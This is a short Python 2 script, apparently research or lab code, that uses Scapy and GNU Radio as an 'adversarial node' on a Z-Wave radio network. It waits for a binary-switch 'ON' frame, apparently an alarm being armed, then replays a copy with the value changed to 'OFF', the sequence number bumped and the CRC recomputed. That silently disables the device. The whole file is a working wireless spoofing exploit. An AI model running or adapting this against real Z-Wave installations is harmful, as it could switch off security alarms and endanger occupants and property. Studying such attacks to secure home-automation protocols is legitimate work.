#!/usr/bin/python2

# Adapted script that acts as the adversarial node
# This node listens  

from scapy.all import *
import time


class Adversay(Automaton):
    def parse_args(self, *args, **kargs):
        Automaton.parse_args(self, *args, **kargs)

    @ATMT.state(initial=1)
    def BEGIN(self):
        switch_radio_protocol("zwave")
        self.last_pkt = None
        print "BEGIN"
        raise self.WAITING()

    @ATMT.state()
    def WAITING(self):
        """Wait for the turn on frame """
        print "WAITING FOR PACKET"

    @ATMT.receive_condition(WAITING)
    def alarm_on(self, packet_receive):
        """if receive turn on the alarm then go to TURN_OFF_ALARM"""
        human = lambda p, f: p.get_field(f).i2repr(p, getattr(p, f))
        if ZWaveReq in packet_receive:
            self.last_pkt = packet_receive
            if ZWaveSwitchBin in packet_receive:
                if human(packet_receive[ZWaveSwitchBin], 'switchcmd') == "SWITCH":
                    if human(packet_receive[ZWaveSwitchBin], 'val') == "ON":
                        print "ALARM ON PACKET SEEN"
                        raise self.WAITING()

    @ATMT.action(alarm_on)
    def alarm_off(self):
        time.sleep(0.5)
        pkt = self.last_pkt.copy()
        pkt[ZWaveSwitchBin].val = "OFF"
        pkt.seqn += 1
        pkt.crc = None
        self.send(pkt)
        print "SWITCH ALARM OFF PACKET SENT"


if __name__ == "__main__":
    load_module('gnuradio')
    Adversay(debug=1).run()
